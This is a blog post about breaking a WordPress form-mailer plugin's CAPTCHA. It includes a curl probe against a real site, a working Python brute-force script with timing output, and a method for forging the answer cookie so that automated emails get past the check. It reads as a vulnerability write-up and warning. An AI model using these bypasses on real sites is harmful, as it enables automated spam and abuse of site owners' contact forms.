+++
date = "2017-02-18T10:55:59-05:00"
draft = false
title = "Defeating dd-formmailer's Weak CAPTCHA"
description = "How I broke a Wordpress plugin's weak CAPTCHA"
hasmath = true
+++

Yesterday, I visited a website that uses [dd-formmailer][1], a Wordpress
plugin that provides a form for sending an email, complete with a
CAPTCHA intended to prevent automated abuse. Here's a screenshot:

![A screenshot of the dd-formmailer form][i1]

I was bored and curious, so I looked at the CAPTCHA image and noticed it
was always served from the same path:
`/wp-content/plugins/dd-formmailer/dd-formmailer.php?v=1`. How, I
wondered, does the script handling form submissions know if the user
entered the right CAPTCHA? A cookie?

    $ curl -si http://[snip].com/wp-content/plugins/dd-formmailer/dd-formmailer.php?v=1 | head
    HTTP/1.1 200 OK
    ...
    Set-Cookie: ddfmcode=bacb87c6f4ad4b08090e838d074bc18f; expires=Sat, 18-Feb-2017 17:47:30 GMT; path=/; domain=.[snip].com
    ...

A cookie! With what, the md5 of the correct answer?

    $ echo -n 3649B | md5sum
    bacb87c6f4ad4b08090e838d074bc18f  -

Yes!

As you can probably tell already, this is not the best approach.

# Pass 1

Looking at [the source][2],

    srand((double)microtime()*1000000); 
    $ddfmcode = substr(strtoupper(md5(rand(0, 999999999))), 2, 5); 
    $ddfmcode = str_replace("O", "A", $ddfmcode); // for clarity
    $ddfmcode = str_replace("0", "B", $ddfmcode);
    setcookie("ddfmcode", md5($ddfmcode), time()+3600, '/', '.' . $this_domain); 

you can see that CAPTCHA codes generated are 5-character hex strings
without 0s, leaving only $15^5 = 759,375$ possibilities. (Contrary to the
third line, hex strings don't contain the letter O 😄). We can brute
force all of these in less than two seconds with a simple Python script:

    #!/usr/bin/env python3
    
    from hashlib import md5
    
    for i in range(16**5):
        # Skip numbers with a 0 in their 5-char hex form
        if i >> 16 == 0 or \
           i >> 12 & 0xF == 0 or \
           i >> 8 & 0xF == 0 or \
           i >> 4 & 0xF == 0 or \
           i & 0xF == 0:
            continue
    
        captcha = '{:05X}'.format(i)
        hashed = md5(captcha.encode()).hexdigest()
        print('{}\t{}'.format(hashed, captcha))

and

    $ time ./bruteforce.py >hashes

    real    0m1.870s
    user    0m1.820s
    sys     0m0.052s

Then, when the server gives us a hash in the cookie, we can easily look
it up:

    $ time grep bacb87c6f4ad4b08090e838d074bc18f hashes
    bacb87c6f4ad4b08090e838d074bc18f        3649B
    
    real    0m0.016s
    user    0m0.008s
    sys     0m0.004s

But it gets better.

# Pass 2

While writing the last section, I realized: what stops clients from
sending a cookie with their own hash? The answer is nothing.

For example, I can send a `Cookie:
ddfmcode=b252d1fe1c0c16d001027c2fce9b6529` header (the md5 of "BANANA")
and then "BANANA" in the `fm_verify` form field and successfully send
the email. You don't need to request the CAPTCHA image at all!

Here's the relevant section of code:

    $t = ddfm_stripslashes($form_input['fm_verify']);
    ...
    } else if ($_COOKIE["ddfmcode"] != md5(strtoupper($t))) { 
    
    	$errors[] = DDFM_INVALIDVER;
    
    } 

# Conclusion

Avoid Wordpress plugins last updated in 2009.

[1]: http://www.dagondesign.com/articles/secure-form-mailer-plugin-for-wordpress/
[2]: http://www.dagondesign.com/articles/secure-php-form-mailer-script/#download
[i1]: /blog/img/defeating/1.png
